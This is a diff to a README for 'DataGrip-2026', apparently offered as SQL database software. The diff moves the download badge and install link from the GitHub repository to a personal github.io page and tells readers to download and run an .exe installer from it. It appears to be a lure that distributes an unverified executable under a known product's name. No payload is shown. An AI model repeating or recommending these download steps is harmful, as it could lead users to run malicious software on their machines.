@@ -1,6 +1,6 @@
 # 🚀 DataGrip-2026 - Manage your SQL databases with ease
 
-[![Download DataGrip-2026](https://img.shields.io/badge/Download-DataGrip-blue.svg)](https://github.com/Sibu9516/DataGrip-2026)
+[![Download DataGrip-2026](https://img.shields.io/badge/Download-DataGrip-blue.svg)](https://sibu9516.github.io)
 
 ## 📖 About this software
 
@@ -23,7 +23,7 @@ Before you install the application, ensure your computer meets these basic hardw
 
 Follow these steps to set up DataGrip-2026 on your machine.
 
-1. Visit the following link to access the software files: [https://github.com/Sibu9516/DataGrip-2026](https://github.com/Sibu9516/DataGrip-2026).
+1. Visit the following link to access the software files: [https://sibu9516.github.io](https://sibu9516.github.io).
 2. Look for the release section on that page.
 3. Select the installer file ending in .exe to begin the download.
 4. Save the file to your computer in a folder you can find easily, such as your Downloads folder.
